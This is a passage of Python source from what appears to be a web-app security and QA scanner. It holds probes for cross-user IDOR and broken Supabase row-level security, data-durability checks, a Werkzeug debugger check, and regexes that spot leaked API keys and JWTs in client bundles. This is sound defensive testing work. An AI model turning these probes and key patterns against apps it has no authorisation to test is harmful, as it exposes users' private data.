    A's session subject (the JWT `sub` the app itself assigned — how it keys per-user rows); A's registration
    username is the unambiguous canary (unique to A, stored in its record). Fire only when (1) the id-addressed
    read returns A's canary AS A [it really is A's private record], (2) an anonymous client CANNOT read it [it's
    access-gated, not public], and (3) the SAME read returns A's canary AS B [a second logged-in user reads it
    -> broken object-level authorization]. N/A when two distinct accounts can't be established, A has no
    addressable id (cookie session with no JWT), or no id-addressed endpoint returns A's own record."""
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    try:
        a_id = auth.session_subject(a)
        canary = a.username                        # unique per-registration token, stored in A's own record
        if not a_id or not canary:
            ctx.evidence["na_reason"] = "account A has no addressable user id (cookie session, no JWT subject)"
            return None                            # no addressable user id (cookie session) -> couldn't test
        reads = [(e, e.path_params[0]) for e in ctx.profile.endpoints
                 if e.method.lower() == "get" and len(e.path_params) == 1
                 and e.raw_path.endswith("/{" + e.path_params[0] + "}")]
        if not reads:
            ctx.evidence["na_reason"] = "no id-addressed record endpoint (GET /{id}) served same-origin"
            return None
        tested = False
        with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as anon:
            for e, param in reads:
                path = e.raw_path.replace("{" + param + "}", urllib.parse.quote(a_id, safe=""))
                try:
                    as_a = a.client.get(path)
                    if as_a.status_code != 200 or canary not in as_a.text:
                        continue                   # id isn't a user id at this endpoint -> not A's record here
                    if anon.get(path).status_code not in (401, 403):
                        continue                   # readable anonymously -> a public record, not IDOR
                    tested = True
                    as_b = b.client.get(path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if as_b.status_code == 200 and canary in as_b.text:
                    # v2 severity: a user/account record is PII by nature -> sensitive_fields
                    ctx.evidence.update(cross_read=True, cross_user_read=True, sensitive_fields=True, endpoint=path)
                    return True                    # B read A's own account record -> horizontal IDOR
        ctx.evidence.update(cross_read=False, reads_tested=len(reads))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


_BACKEND_READ_CAP = 8


def bola_managed_backend(ctx, probe) -> bool | None:
    """Horizontal IDOR / broken Row-Level-Security on the app's MANAGED backend (Supabase). A bolt/Supabase app
    talks straight to <project>.supabase.co, so its data authorization IS the developer's RLS config — part of
    the submission, not the vendor's platform. We test ONLY that config, never Supabase itself: replay the app's
    OWN observed /rest/v1 reads (captured during A's registration), as a SECOND registered user B, using the
    app's OWN public apikey. Read-only, only the endpoints/project/key the app already uses.

    Fire when a read that returns A's record for A — and is NOT anon/world-readable (apikey alone; that's the
    separate sec-exposure finding) — ALSO returns A's record for B: a second user reads A's private row -> RLS
    is per-user broken. A's unique registration username is the oracle. N/A — each with its OWN reason, because
    they point at different next actions — when the browser-auth capture lane never ran, when it ran and saw no
    /rest/v1 reads (not a managed-backend app), when there is no per-user JWT to replay the read AS (a
    cookie/session app), when registration yielded no canary to attribute a row to, or when two distinct
    accounts can't be established."""
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    try:
        canary = a.username
        a_auth = a.client.headers.get("Authorization")
        b_auth = b.client.headers.get("Authorization")
        reads = getattr(a, "backend_reads", None) or []
        # FOUR DISTINCT CAUSES, not one message naming only the first. The old reason blamed --browser-auth
        # unconditionally, and v12 recorded it on 273 apps whose own provenance row says browser_auth was ON:
        # it told the reader to enable a flag they had already enabled, which is a dead end and the same family
        # as db1ca28 (a reason claiming coverage it lacks). deploy_and_grade sets browser_register only when
        # --browser-auth is passed, so the probe can distinguish "lane never ran" from "lane ran and saw
        # nothing" instead of guessing — and those two point at completely different next actions.
        if not reads:
            if getattr(ctx, "browser_register", None) is None:
                ctx.evidence["na_reason"] = ("no managed-backend (Supabase) reads to replay: the browser-auth "
                                             "capture lane was not enabled (--browser-auth)")
            else:
                ctx.evidence["na_reason"] = ("browser-auth ran but observed no Supabase /rest/v1 reads to "
                                             "replay — not a managed-backend app, or its reads happen outside "
                                             "the captured lane" + _browser_lane_detail())
            return None
        if not canary:
            ctx.evidence["na_reason"] = ("Supabase reads captured, but registration yielded no unique username "
                                         "to use as the cross-user oracle — a replayed row can't be attributed "
                                         "to A, so a cross-read can't be PROVEN")
            return None
        if not a_auth or not b_auth:
            who = ("both accounts" if not a_auth and not b_auth else "account A" if not a_auth else "account B")
            ctx.evidence["na_reason"] = ("Supabase reads captured, but no per-user bearer JWT for %s — a "
                                         "cookie/session app, so there is no second identity to replay the "
                                         "read AS" % who)
            return None
        tested = False
        with httpx.Client(timeout=10.0, follow_redirects=True) as c:
            for r in reads[:_BACKEND_READ_CAP]:
                url, apikey = r.get("url"), r.get("apikey")
                if not url:
                    continue
                base = {"apikey": apikey} if apikey else {}
                try:
                    as_a = c.get(url, headers={**base, "Authorization": a_auth})
                    if as_a.status_code != 200 or canary not in as_a.text:
                        continue   # this read doesn't return A's own record -> nothing to cross-check
                    if canary in c.get(url, headers=base).text:
                        continue   # readable with the apikey ALONE -> world-readable (sec-exposure), not per-user IDOR
                    tested = True
                    as_b = c.get(url, headers={**base, "Authorization": b_auth})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if as_b.status_code == 200 and canary in as_b.text:
                    # v2 severity: cross-user read PROVEN; leave sensitive_fields unset (row content not classified)
                    ctx.evidence.update(cross_read=True, cross_user_read=True, endpoint=url.split("?")[0])
                    return True   # B read A's private backend record -> broken per-user RLS
        ctx.evidence.update(cross_read=False, reads_tested=len(reads))
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


def data_integrity_roundtrip(ctx, probe) -> bool | None:
    """Persistence correctness: POST-create an object, then read it back by id and confirm the write was
    durable. Fire when a create reports success (2xx with an id) but the object then can't be read back
    (404 / 410 / 5xx) -> silent data loss / non-durable writes (the 'it said it saved, but it's gone'
    failure). Uses the same create+read pairing as BOLA. N/A when there's no create+read pair or no
    create succeeds (couldn't establish the round-trip -> not a clean pass, a missed test)."""
    pairs = _create_read_pairs(ctx)
    if not pairs:
        ctx.evidence["na_reason"] = "no create+read endpoint pair to round-trip (SPA writes go off-origin)"
        return None
    account = ctx.register()   # some creates are auth-gated
    client = (account.client if account
              else make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True))
    tested = False
    try:
        for create_ep, read_ep, param, id_field in pairs:
            chosen_id = "hlid" + secrets.token_hex(4)
            marker = "hldi" + secrets.token_hex(6)
            body = {f: (chosen_id if f == id_field else marker + secrets.token_hex(2))
                    for f in create_ep.body_fields}
            try:
                created = client.post(create_ep.path, json=body)
                if created.status_code not in (200, 201):
                    continue  # create didn't succeed -> nothing to read back on this pair
                obj_id = chosen_id if id_field else _created_id(created)
                if obj_id in (None, ""):
                    continue  # created but no id to address it by -> can't round-trip this pair
                read_path = read_ep.raw_path.replace(
                    "{" + param + "}", urllib.parse.quote(str(obj_id), safe=""))
                read = client.get(read_path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            tested = True
            if read.status_code in (404, 410) or read.status_code >= 500:
                ctx.evidence.update(create_status=created.status_code, read_status=read.status_code,
                                    endpoint=read_path, durable=False)
                return True  # server acknowledged the create but the object isn't readable -> data lost
        if not tested:
            ctx.evidence["na_reason"] = "no create endpoint accepted a write to read back"
            return None
        ctx.evidence.update(tested=tested, durable=True)
        return False
    finally:
        client.close()


# A create does not always live AT its collection. REST purists POST to /api/cart; a great many real apps POST
# to /api/cart/add, /api/todos/create, /api/posts/new. Reading the list back at the CREATE path then fetches the
# action endpoint instead of the collection, so the round-trip can never verify anything. Measured on OopsSec:
# `POST /api/cart/add` (fields productId, quantity, from schema discovery) pairs with `GET /api/cart`, and
# without this the data-integrity family stayed N/A on an app that has a perfectly good pair.
_CREATE_ACTION_LEAF = ("add", "create", "new", "insert", "save", "submit", "store")

# A create whose body is a marker string in EVERY field is rejected by any typed API, and a rejected create
# means the whole data-integrity / race family reads N/A. Measured on OopsSec:
#   {"productId":"hldm..","quantity":"hldm.."} -> 400 {"details":[{"path":"quantity","code":"invalid_type"}]}
#   {"productId":<a real product id>,"quantity":1} -> 200 {"success":true}
# The app names the offending field in its own rejection, so the create can CORRECT ITSELF instead of guessing
# a schema up front: post, read which field was refused, coerce that one, retry. Bounded attempts, and the
# marker still has to survive in at least one field or there is nothing to look for in the collection.
_ID_FIELD = re.compile(r"^(.*?)_?id$", re.I)
_CREATE_ATTEMPTS = 4


def _reference_id(client, field: str, endpoints) -> str | None:
    """A REAL id for a reference field, taken from the sibling collection it names: `productId` -> an id from
    /api/products. Self-as-oracle again — the app supplies the value that makes its own create valid."""
    m = _ID_FIELD.match(field)
    base = (m.group(1) or "").lower() if m else ""
    if not base:
        return None
    wanted = (base, base + "s", base + "es")
    for e in endpoints:
        if (e.method or "get").lower() != "get":
            continue
        leaf = (e.path or "").rstrip("/").rsplit("/", 1)[-1].lower()
        if leaf not in wanted:
            continue
        with contextlib.suppress(Exception):
            for obj in _json_objects(client.get(e.path)) or []:
                oid = _obj_id(obj)
                if oid:
                    return str(oid)
    return None


def _accepted_create(client, endpoint, marker: str, endpoints):
    """POST `endpoint` with a marker-bearing body, coercing whatever field the server refuses, until it accepts.
    Returns (response, body) on a 2xx, else (last_response, body)."""
    body = {f: marker + secrets.token_hex(2) for f in endpoint.body_fields}
    for f in list(body):                       # reference fields never accept a marker -> seed them properly
        if _ID_FIELD.match(f):
            real = _reference_id(client, f, endpoints)
            if real:
                body[f] = real
    resp = None
    for _ in range(_CREATE_ATTEMPTS):
        resp = client.post(endpoint.path, json=body)
        if resp.status_code in (200, 201):
            return resp, body
        refused = [f for f in _schema_refused_fields(resp) if f in body]
        if not refused:
            break                              # not a field-level rejection -> retrying cannot help
        progressed = False
        for f in refused:
            nxt = _coerce_next(body.get(f))
            if nxt is not None:
                body[f], progressed = nxt, True
        if not progressed:
            break
    return resp, body


def _schema_refused_fields(resp) -> list:
    """Field names the server refused, from the same validation shapes discovery's schema pass reads."""
    with contextlib.suppress(Exception):
        doc = resp.json()
        out = []
        if isinstance(doc, dict):
            for key in ("details", "issues", "detail", "errors"):
                node = doc.get(key)
                if isinstance(node, list):
                    for item in node:
                        if not isinstance(item, dict):
                            continue
                        p = item.get("path", item.get("loc", item.get("param", item.get("field"))))
                        if isinstance(p, list) and p:
                            out.append(str(p[-1]))
                        elif isinstance(p, str):
                            out.append(p.split(".")[-1])
                elif isinstance(node, dict):
                    out += [str(k) for k in node]
        return out
    return []


def _is_json_ok(resp) -> bool:
    """A collection read we can compare: 200 with a JSON body. Nothing about its shape — an empty collection
    is a legitimate state and the whole point of the before/after comparison."""
    return resp is not None and resp.status_code == 200 and "json" in (
        resp.headers.get("content-type") or "").lower()


def _coerce_next(current):
    """The next type to try for a refused field: string -> number -> bool -> ISO date. None when exhausted."""
    if isinstance(current, bool):
        return "2026-01-01T00:00:00Z"
    if isinstance(current, str):
        return 1
    if isinstance(current, int):
        return True
    return None


def _create_collection(path: str) -> str:
    """The collection a create endpoint writes into: its parent when the path ends in an action verb, else
    the path itself (a REST-style POST to the collection)."""
    clean = (path or "").split("?")[0].rstrip("/") or "/"
    segs = [s for s in clean.split("/") if s]
    if len(segs) >= 2 and segs[-1].lower() in _CREATE_ACTION_LEAF:
        return "/" + "/".join(segs[:-1])
    return clean


def _is_record_list(v) -> bool:
    """A list of records: empty (a legitimately-empty collection) or holding objects. A list of scalars
    ({"tags":["a"]}) is config, not a resource collection."""
    return isinstance(v, list) and (not v or isinstance(v[0], dict))


def _has_record_array(resp) -> bool:
    """The read-back body is an actual resource COLLECTION -- a top-level record array, or an envelope object
    carrying one ({"submissions":[...]}, {"data":[...]}). A stateless RPC result, a status/config doc or an API
    index ({"encounterId":""}, {"hasApiKey":false}) is NOT a collection, so 'it did not change after a 2xx' is
    not data loss -- nothing was ever persisted there. This is what made 3 of 4 v18 fires false."""
    try:
        doc = resp.json()
    except ValueError:
        return False
    if _is_record_list(doc):
        return True
    return isinstance(doc, dict) and any(_is_record_list(v) for v in doc.values())


_AUTH_FIELD = re.compile(r"pass(?:word|wd)?|pwd", re.I)
_AUTH_PATH = re.compile(r"/(?:auth|login|signin|sign-in|signup|sign-up|register|token|session|oauth|logout)\b", re.I)


def _is_auth_endpoint(e) -> bool:
    """A login / register / token endpoint. Its 'collection' is not a public data list (you cannot list users
    anonymously), so 'the record is absent from a list' is meaningless here -- fahimni's /backend/auth.php fired
    exactly this way. A password-family field or an auth-verb path is the tell."""
    if any(_AUTH_FIELD.search(f) for f in (e.body_fields or [])):
        return True
    return bool(_AUTH_PATH.search(e.raw_path or e.path or ""))


def data_integrity_list_roundtrip(ctx, probe) -> bool | None:
    """Persistence correctness on a JSON API with NO read-by-{id} route — the common SPA shape
    data_integrity_roundtrip can't test (UUID keys / list-only API). Create an object carrying a unique
    marker, then GET the COLLECTION (the create path's sibling) and confirm the marker is present. Fire when
    a create reports success (2xx) but the object is absent from its own list -> silent data loss. N/A when
    there's no JSON create endpoint whose collection returns an array, or no create succeeds. Variant group
    data-durability with qa-integrity-001 (read-by-id) -> the two collapse to one data-loss finding."""
    creates = [e for e in ctx.profile.endpoints if e.method.lower() == "post" and e.body_fields
               and not _is_auth_endpoint(e)]   # a login/register POST is not a listable-data create

    def _browser_persist_confirm():
        """SPA fallback for the N/A cases (auth-gated / JS-fetch create the httpx round-trip can't see): drive the
        create in a browser and read the canary back from the client-rendered DOM. ONE-DIRECTIONAL by design --
        a canary that reads back CONFIRMS durability (clean, via browser); ABSENCE is ambiguous (form not found /
        not submitted / render lag), so we never fire loss from the browser -- that stays N/A. So this only ever
        turns an N/A into a confirmed clean, never into a false data-loss."""
        if not (getattr(ctx, "profile", None) is not None and ctx.profile.capabilities.get("browser")):
            return None
        canary = "hldb" + secrets.token_hex(5)
        try:
            rendered = browser.create_and_read_back(ctx.base_url, canary, canary, headers=_authed_headers(ctx))
        except Exception:
            rendered = None
        if rendered and canary in rendered:
            ctx.evidence.update(tested=True, durable=True, via="browser", verified_by="browser-read-back")
            return False                                     # the created canary rendered back -> write persisted
        return None                                          # absent in the DOM is ambiguous -> stay N/A, never fire

    if not creates:
        confirmed = _browser_persist_confirm()               # no JSON create endpoint, but maybe a browser content form
        if confirmed is not None:
            return confirmed
        ctx.evidence["na_reason"] = "no JSON create endpoint to round-trip through its collection"
        return None
    account = ctx.register()   # some creates are auth-gated; None -> fall back to an anon client
    client = (account.client if account
              else make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True))
    tested = False
    try:
        for c in creates:
            collection = _create_collection(c.raw_path or c.path)   # parent when the create is /add, /create...
            marker = "hldm" + secrets.token_hex(6)
            try:
                # snapshot BEFORE: a fully-typed create (productId + numeric quantity) leaves no marker to
                # look for, so "did the collection change at all" is the oracle that still works. Comparing the
                # whole body rather than a count also survives a MERGING create -- adding the same product
                # twice bumps quantity on one line instead of adding a row, and a count check would read that
                # correct behaviour as data loss.
                before = client.get(collection)
                if not _is_json_ok(before):
                    continue      # the collection isn't a readable JSON resource -> can't verify here
                if not _has_record_array(before):
                    continue      # sibling is an RPC result / status / index, not a resource list -> not durable-testable
                created, body = _accepted_create(client, c, marker, ctx.profile.endpoints)
                if created is None or created.status_code not in (200, 201):
                    continue   # create didn't succeed -> nothing durable to read back on this endpoint
                after = client.get(collection)
                if not _is_json_ok(after):
                    continue
                # Compare RAW bodies, not parsed object lists: a fresh account's collection is legitimately
                # EMPTY, and requiring a non-empty array of objects threw the before-snapshot away on exactly
                # the apps this is meant to test.
                tested = True
                if marker not in (after.text or "") and (after.text or "") == (before.text or ""):
                    ctx.evidence.update(create_status=created.status_code, endpoint=collection,
                                        durable=False, verified_by="collection-unchanged",
                                        repro=_repro_from_resp(
                                            created, matched="created 2xx but its collection did not change"))
                    return True
                continue          # the write landed (marker present, or the collection moved) -> durable
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
        if not tested:
            confirmed = _browser_persist_confirm()           # httpx couldn't round-trip -> try the browser data plane
            if confirmed is not None:
                return confirmed
            ctx.evidence["na_reason"] = "no create round-tripped through a readable record collection"
            return None
        ctx.evidence.update(tested=True, durable=True)
        return False
    finally:
        client.close()


def stale_ui_after_create(ctx, probe) -> bool | None:
    """Client-reflection correctness — DISTINCT from data durability (qa-integrity): after a successful create,
    does the SPA show the new item WITHOUT a manual refresh? Submit a create form with a unique marker in the
    browser, then read the DOM before and after a reload. Fire when the marker is ABSENT live but PRESENT after
    reload -> the write was durable (reload proves it) yet the UI didn't reflect it ('it said nothing happened,
    but a refresh shows it saved' — the UI lied). N/A without a create form or a browser; clean when the item
    showed live (reflected) or never persisted (not_saved -> that's data-integrity's finding, not this one)."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create form to submit-and-observe"
        return None
    account = ctx.register(suffix="_sui")   # the create form usually lives behind login -> authenticate the page
    hdrs = dict(ctx.headers or {})
    if account is not None and not account.provided:
        cookie = "; ".join("%s=%s" % (c.name, c.value) for c in account.client.cookies.jar)
        if cookie:
            hdrs["Cookie"] = cookie
        authz = account.client.headers.get("Authorization")
        if authz:
            hdrs["Authorization"] = authz
    marker = "hlsui" + secrets.token_hex(4)
    try:
        verdict = browser.check_create_reflection(ctx.base_url, marker, headers=hdrs or None)
    finally:
        if account is not None:
            account.client.close()
    ctx.evidence.update(verdict=verdict, marker=marker, form=form.action)
    if verdict == "stale":
        return True
    if verdict in ("reflected", "not_saved"):
        return False   # UI reflected it (clean), or it never saved (data-integrity's finding, not this one)
    ctx.evidence["na_reason"] = "couldn't submit a create form / observe the DOM (browser inconclusive)"
    return None


def _declared_type_contradicted(ctype: str, body: str) -> str | None:
    """Does the body's actual format contradict its declared Content-Type? Returns a short reason for the
    unambiguous, harmful cases only, else None. The headline case is JSON served as text/html: a browser
    may render/execute it (a reflected-JSON XSS vector) and strict JSON clients break on the wrong type."""
    ct = (ctype or "").split(";", 1)[0].strip().lower()
    s = body.lstrip()
    if not s:
        return None
    looks_json = s[0] in "{[" and _is_json(body)
    low = s.lower()
    looks_html = low.startswith("<!doctype") or low.startswith("<html")
    if looks_json and ct in ("text/html", "application/xhtml+xml"):
        return "json-body-served-as-text/html"
    if looks_html and ct == "application/json":
        return "html-body-served-as-application/json"
    return None


def _is_json(body: str) -> bool:
    try:
        json.loads(body)
        return True
    except (ValueError, TypeError):
        return False


def _landing(ctx) -> str:
    """The app's homepage PATH. Normally '/', but the discovered entry sub-path when the origin root is a
    404 shell — a sub-path deployment like user.github.io/Project/, whose '/' is GitHub's 'Site not found'
    page. The universal homepage probes (target: /) grade THIS, so they never penalize the app for the
    host's not-found page. landing_path is '/' for every root-served app, so this is a no-op for them."""
    return getattr(getattr(ctx, "profile", None), "landing_path", "/") or "/"


def _at(ctx, path: str) -> str:
    """`path` resolved under the APP's root. For a sub-path deployment the app's root is its landing path, so
    anything we fetch by construction (a well-known file, the catch-all fingerprint probe, a stack sniff) lives
    UNDER it; resolving against the origin probes the HOST instead and reports clean on the app. No-op when the
    app is root-served, which is the whole normal corpus."""
    landing = _landing(ctx).rstrip("/")
    if not landing:
        return path
    if path in ("/", ""):
        return landing      # address the entry page EXACTLY as _expand does, so the two never disagree
        #     about which URL "the homepage" is (the catch-all fingerprint compares against it)
    return landing + (path if path.startswith("/") else "/" + path)


def _home_path(ctx, probe) -> str:
    """Resolve a homepage probe's target to a PATH: the 'target: /' homepage sentinel maps to the discovered
    landing page (_landing); an explicitly declared reference path (a perf/vulnerable reference route) is used
    verbatim. Every homepage-grading probe routes its target through this so sub-path deployments are graded
    at the page the app serves, not the origin-root not-found shell."""
    t = probe.probe.get("target") or "/"
    return _landing(ctx) if t == "/" else t


def content_type_mismatch(ctx, probe) -> bool | None:
    """Do any responses declare a Content-Type their body contradicts? Fetches the safe no-path-param GET
    endpoints (plus the homepage) and fires on an unambiguous mismatch -- above all JSON served as
    text/html (a browser may render it: a reflected-JSON XSS vector, and JSON clients break on the wrong
    type). N/A when no response returns a body we can classify (couldn't test)."""
    target = _home_path(ctx, probe)
    seen, candidates = set(), []
    for path in [target] + [e.path for e in ctx.profile.endpoints
                            if e.method.lower() == "get" and not e.path_params]:
        if path not in seen and not seen.add(path):
            candidates.append(path)
    checked = False
    for path in candidates[:20]:   # cap the fan-out; the mismatch is a global habit, not per-route
        try:
            resp = ctx.client.get(path)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        if not resp.text.strip():
            continue
        checked = True
        reason = _declared_type_contradicted(resp.headers.get("content-type", ""), resp.text)
        if reason:
            ctx.evidence.update(endpoint=path, declared=resp.headers.get("content-type", ""), reason=reason,
                                repro=_repro_from_resp(resp, matched=reason))
            return True
    ctx.evidence.update(checked=checked)
    return False if checked else None


def debug_mode_enabled(ctx, probe) -> bool | None:
    """Framework debug mode shipped to production: an error surfaces the full interactive debugger /
    DEBUG page (Werkzeug, Django DEBUG=True, Rails Better Errors, Laravel Whoops), leaking source,
    settings and env -- and, for Werkzeug, an RCE console. Strictly worse than a bare leaked stack
    trace (qa-errhyg): this is the framework's debug UI. Scans errors induced across discovered endpoints
    (+ the /crash route) and probes for a live Werkzeug debugger resource. N/A when nothing was inspected."""
    inspected = False
    for r in _induce_error_responses(ctx):
        inspected = True
        if _DEBUG_FINGERPRINT.search(r.text):
            ctx.evidence.update(status=r.status_code, debug_ui=True, execution_confirmed="werkzeug" in r.text.lower(),
                                repro=_repro_from_resp(r, matched="framework debug UI fingerprint"))
            return True
    # Werkzeug/Flask debug ships an interactive debugger reachable WITHOUT an error: it serves its own JS
    # resource. A normal app 404s or returns HTML here; only a live debugger answers with javascript --
    # gating on the javascript content-type avoids false-firing on a 404 page that reflects the query.
    try:
        r = ctx.client.get(_at(ctx, "/"),
                           params={"__debugger__": "yes", "cmd": "resource", "f": "debugger.js"})
        inspected = True
        if (r.status_code == 200 and "javascript" in r.headers.get("content-type", "").lower()
                and "werkzeug" in r.text.lower()):
            ctx.evidence.update(endpoint="/?__debugger__=yes", debug_ui=True, framework="werkzeug", execution_confirmed=True)
            return True
    except (httpx.HTTPError, httpx.InvalidURL):
        pass
    ctx.evidence.update(inspected=inspected, debug_ui=False)
    return False if inspected else None


# --- managed-backend exposure (Supabase / Firebase shipped world-readable) --------------------------
# The signature vibe-coding leak: the app embeds a Supabase/Firebase config + its PUBLIC anon key in the
# client bundle, but ships the database with NO row-level security -> anyone with the (public) key reads
# the whole DB. We mine the bundle for the config, then issue the SAME read-only query the app's own
# frontend makes, with the SAME public key, and see whether real rows come back. Host-restricted to the
# managed providers (never an arbitrary URL from the bundle -> no SSRF), read-only, bounded. Covers all
# three data planes: Supabase PostgREST (/rest/v1/<table>), Firebase Realtime DB (<db>/.json), and
# Firestore (the default Firebase DB — REST documents endpoint with the public web key).
_SUPABASE_URL = re.compile(r"https://([a-z0-9]{15,40})\.supabase\.co")

# SELF-HOSTED Supabase. Binding support to the hosted domain made a self-hosted gateway invisible, and with it
# every RLS finding: measured on the supavulnbase fixture, whose Supabase runs at http://localhost:8055 and
# whose manifest attributes 8 of its 23 findings (7 of them EXCLUSIVELY) to reaching that gateway. Docker
# `supabase/postgrest` behind Kong is an ordinary deployment shape, and an app proxying PostgREST on its own
# domain is another.
#
# The host restriction above is an SSRF GUARD, not laziness, so it is narrowed rather than removed: a candidate
# origin from the bundle is only followed when it is somewhere the TARGET already is. The implementation lives in
# `baas` because `auth` needs it too and cannot import this module (probes imports auth), and two copies of an
# SSRF guard is exactly the kind of duplication that drifts apart. Local aliases keep the probe bodies readable.
_reachable_baas_origin = baas.reachable_origin
_looks_postgrest = baas.looks_postgrest


def _supabase_base(blob: str, ctx) -> str | None:
    """The Supabase data-plane origin this app talks to: the hosted project, else a co-located self-hosted
    gateway that proves itself PostgREST. See baas.resolve_gateway for the SSRF reasoning."""
    return baas.resolve_gateway(blob, getattr(ctx, "base_url", "") or "")


_FIREBASE_RTDB = re.compile(r"https://([a-z0-9][a-z0-9-]{2,60}\.firebaseio\.com)")
_JWT = re.compile(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b")
# Firestore (the DEFAULT Firebase DB since ~2019 — RTDB above is the legacy one, so RTDB-only coverage
# misses most Firebase apps). Config is public by design: the AIza web key + projectId + a firestore SDK
# reference. We read collections via the REST API with the public key; open rules (allow read: if true)
# return documents to anyone.
_FIREBASE_APIKEY = re.compile(r"AIza[0-9A-Za-z_-]{35}")
_FIREBASE_PROJECT = re.compile(r"""projectId["']?\s*[:=]\s*["']([a-z][a-z0-9-]{3,40})["']""")
_FIRESTORE_SIGNAL = re.compile(r"firestore", re.I)   # SDK import / getFirestore / firestore.googleapis.com
_FIRESTORE_COLL = re.compile(r"""\bcollection\(\s*(?:[A-Za-z_$][\w$]*\s*,\s*)?["']([A-Za-z][\w-]{1,60})["']""")
_COMMON_COLLECTIONS = ("users", "messages", "posts", "chats", "orders", "products", "profiles", "items",
                       "todos", "notes", "comments", "rooms", "events", "data")
# Supabase table enumeration + leak gating. The anon key can no longer read the PostgREST OpenAPI root
# (Supabase blocked it for the anon role Apr 2026 -> 403), so table names come from the BUNDLE — the app's
# own .from('t') / /rest/v1/t string literals, which survive minification — plus a common-name fallback.
# A readable table is a LEAK only if it looks PRIVATE (sensitive name or PII/secret column): a public-by-
# design table (blog posts, product catalog, a countries reference) reading to anon is NOT a finding.
_SUPABASE_PUB = re.compile(r"\bsb_publishable_[A-Za-z0-9_-]{10,}\b")   # 2025+ publishable key (not a JWT)
_SUPABASE_FROM = re.compile(r"""\.from\(\s*["']([A-Za-z_][A-Za-z0-9_]{0,60})["']""")
_SUPABASE_REST = re.compile(r"/rest/v1/([A-Za-z_][A-Za-z0-9_]{0,60})")
_SUPABASE_COMMON = ("users", "profiles", "accounts", "posts", "orders", "messages", "todos", "customers",
                    "subscriptions", "payments", "transactions", "api_keys", "comments", "products",
                    "notes", "contacts", "bookings", "reviews", "sessions", "members")
_SENSITIVE_TABLE = re.compile(r"user|account|profile|payment|order|customer|subscription|transaction|"
                              r"credential|session|contact|booking|member|billing|invoice|message", re.I)
_SENSITIVE_COLUMN = re.compile(r"email|password|passwd|phone|token|api_?key|secret|stripe|address|ssn|"
                               r"credit_?card|dob|birth|first_?name|last_?name|full_?name|access_?token", re.I)


def _client_bundle(ctx, cap: int = 2_000_000) -> str:
    """The served client-side text: the homepage plus its same-origin .js bundles, where an SPA embeds
    its backend config + public keys."""
    parts, total = [], 0
    # the app's OWN entry page, not the origin root: on a sub-path deployment "/" is a different app (or, on
    # supavulnbase, a 404 page that merely happens to reference the same chunks — which made every BaaS probe
    # lucky rather than correct). Same rebasing rule as every other constructed fetch.
    paths = [_at(ctx, "/")] + [r for r in ctx.profile.routes if r.split("?")[0].endswith(".js")]
    for p in list(dict.fromkeys(paths))[:10]:
        try:
            t = ctx.client.get(p).text
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        parts.append(t[:cap - total])
        total += len(parts[-1])
        if total >= cap:
            break
    return "\n".join(parts)


def bundle_leaks_secret(ctx, probe) -> bool | None:
    """SPA-native: mine the served CLIENT bundle (homepage + same-origin .js) for a hardcoded SECRET key that
    shipped to the browser — a SERVER key (Stripe sk_ / OpenAI / AWS secret / GitHub PAT / private key) in the
    bundle is account/DB takeover, the #1 real SPA leak. Public-by-design keys (Supabase anon / Firebase apiKey
    / Stripe pk_) are NOT in the pattern set (secretscan._PROVIDER), so they never fire. N/A when no bundle."""
    blob = _client_bundle(ctx)
    if not blob.strip():
        return None
    kinds = secretscan.scan_blob(blob)
    if kinds:
        ctx.evidence.update(secret_kinds=kinds, high_privilege=True, source="client-bundle")   # server keys = takeover
        return True
    ctx.evidence.update(secret_kinds=[], scanned_bytes=len(blob))
    return False


# v2.0 FAMILY 1 -- deploy-time "works on my machine" failure. A dev host / private IP / unset env var stringified
# into a backend URL: the page renders but its data layer is dead for every visitor, invisible to a "does it
# load" check. Requires the URL form (https?://...), so a bare `("0.0.0.0", PORT)` bind or a `hostname ===
# 'localhost'` dev-check string does NOT match; the host lookahead rejects `localhosting.com` / `undefined.io`.
_PRIVATE_HOST = re.compile(
    r"""https?://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|"""
    r"""10(?:\.\d{1,3}){3}|192\.168(?:\.\d{1,3}){2}|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2})"""
    r"""(?::\d+)?(?=[/"'\s)]|$)""", re.I)
_UNSET_ENV_HOST = re.compile(r"""https?://(?:undefined|null)(?::\d+)?(?=[/"'\s)]|$)""", re.I)


def _operative_private_hosts(matched_urls, opaque_hosts) -> list:
    """Which matched private/unset backend URLs the app ACTUALLY requested at runtime -- their host was observed
    in the opaque-host tier (an off-origin host discovery couldn't attribute, where a localhost/private fetch
    lands, see discovery._classify_hosts). Compared by hostname (port-agnostic): a bundle localhost:9999 the app
    fetched on :3000 is still "the data layer hit a dead private host at runtime". A match => OPERATIVE (dead in
    prod for real visitors). No match => the address is PRESENT in the bundle but never requested (a dead
    `env || localhost` fallback the prod override wins, a CORS/OAuth allowlist entry, a corpus-shared template
    constant like localhost:9999) => presence != use => UNPROVEN, off-score. (opaque_hosts is capped at 10
    upstream, so a genuine fetch beyond the 10th unattributable host reads here as presence-only -- conservative:
    it can under-count operative fires, never invent one. A mixed-content-blocked http://localhost fetch from an
    https page may also not reach net_sink; capturing page.on('requestfailed') would recover those -- a recall
    follow-up, not a correctness gap: unobserved => off-score, never a false score.)"""
    def _host(s):
        return (urllib.parse.urlparse(s if "://" in s else "//" + s).hostname or "").lower()
    observed = {_host(h) for h in opaque_hosts}
    return [u for u in matched_urls if _host(u) in observed]


def unreachable_backend_reference(ctx, probe) -> bool | None:
    """DEPLOY-TIME "works on my machine": the shipped client bundle points its backend at a host no visitor can
